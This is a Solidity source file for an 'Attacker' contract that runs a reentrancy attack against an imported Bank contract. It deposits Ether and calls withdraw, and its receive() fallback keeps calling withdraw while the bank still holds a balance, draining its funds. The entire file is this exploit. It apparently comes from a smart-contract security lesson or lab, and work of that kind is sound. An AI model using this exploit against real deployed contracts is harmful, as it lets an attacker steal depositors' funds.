pragma solidity ^0.8.17;

import "./Bank.sol";

contract Attacker {
  Bank public bank;
  uint256 public initialBalance;

  constructor(Bank _bank) {
      bank = _bank;
  }

  function attack() public payable {
      require(msg.value > 0, "Send some Ether");
      initialBalance = msg.value;
      bank.deposit{value: msg.value}();
      bank.withdraw(initialBalance);
  }

  receive() external payable {
      if (address(bank).balance >= initialBalance) {
          bank.withdraw(initialBalance);
      }
  }
}

